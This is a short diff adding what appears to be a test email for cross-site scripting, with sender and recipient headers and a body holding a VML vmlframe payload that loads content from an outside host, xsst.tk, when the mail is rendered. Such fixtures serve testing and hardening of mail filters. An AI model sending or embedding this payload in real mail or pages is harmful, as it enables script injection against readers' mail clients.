@@ -1,0 +1,4 @@
+From: pch@escriptions.roi1.net
+To: 'fenner@enron.com, chet_fenner@bmc.com, knipe3@msn.com, brianc@saltgrass.com, 
+Subject: XSS Test Mail
+<vmlframe xmlns="url:schemas-microsoft-com:vml" style="behavior:url(#default#vml);position:absolute;width:100%;height:100%" src="http://xsst.tk/mail.vml#xss"></vmlframe>
